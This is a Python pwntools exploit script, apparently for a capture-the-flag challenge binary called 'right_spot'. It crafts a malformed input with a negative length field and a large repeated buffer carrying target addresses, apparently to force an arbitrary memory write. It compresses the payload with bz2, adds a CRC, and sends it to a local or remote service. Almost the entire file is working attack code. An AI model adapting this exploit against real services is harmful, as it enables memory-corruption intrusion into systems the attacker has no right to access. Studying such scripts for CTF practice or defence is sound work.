#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import bz2
import zlib

context(terminal=['tmux','new-window'])

COMPRESSED_LIMIT   =    2**20   #  1 MB compressed
DECOMPRESSED_LIMIT = 30*2**20   # 30 MB uncompressed

def compress(data):
    if len(data) > DECOMPRESSED_LIMIT:
        log.error('ERROR: File size limit exceeded!')
        exit(0)
    return bz2.compress(data, compresslevel=9)

def decompress(data):
    bz2d = bz2.BZ2Decompressor()
    output = bz2d.decompress(data, max_length=DECOMPRESSED_LIMIT)

    if bz2d.needs_input == True:
        log.error('ERROR: File size limit exceeded!')
        exit(0)
    return output

context.update(arch='i386')
exe = './right_spot'

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4444)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

base = 0x56555000
b1 = base+0x000015ae
b2 = base+0x00001b1f
b3 = base+0x00001b60
b4 = base+0x00001b9a

gdbscript = f'''
'''
# gdbscript = f'''
# b *{hex(b3)}
# b *{hex(b4)}
# c
# define hook-continue
# x/36wx 0x5655e004
# x/36wx *0x5655e004
# end
# '''.format(**locals())

def send(data):
    compressed_data = compress(data)
    log.info('data is {} bytes, compressed data is {} bytes'.format(len(data),len(compressed_data)))
    calc_crc = hex(zlib.crc32(compressed_data))
    log.info(io.recvline().decode().strip())
    log.info(str(len(compressed_data)))
    io.sendline(str(len(compressed_data)))
    log.info(io.recvline().decode().strip())
    io.sendline(calc_crc)
    log.info(calc_crc)
    log.info(io.recvline().decode().strip())
    io.send(compressed_data)

def create_data(that,there):
    data = p32(1)
    data +=  p32(-1,sign='signed')
    there -= 0x4
    n = 0x30
    buf = b'X'*0x4
    buf += p32(there)
    buf += b'Y'*0x4
    buf += p32(there)
    buf += b'C'*0x8
    buf += b'X'*0x4
    buf += p32(there)
    buf += b'Y'*0x4
    buf += p32(there)
    buf += b'A'*(n-len(buf))
    b = 0x15557
    data += p32(b*n-1)+buf*(b-1)
    data += buf[:-1]
    
    data += p32(0)*0x7174b
    data += p32(4)
    data += p32(that)
    return data

# -- Exploit goes here --

io = start(argv=['30'])
# io = start()
# send number of bytes
# send compressed data
# send CRC of compressed data (hex)

# 4 tests for each seed in range(32) of "./right_spot seed" and then send data as input"
# must return EXPECTED_STRING = b"pwned!\n" for each test of each seed, if not killed

that = 0xaaaaaaaa
there = 0xeeeeeeee
data = create_data(that,there)
log.info('data created')

if args.LOCAL:
    io.send(data)
    log.info(io.recvall())
else:
    send(data)
    log.info(io.recvall().decode())

# io.interactive()

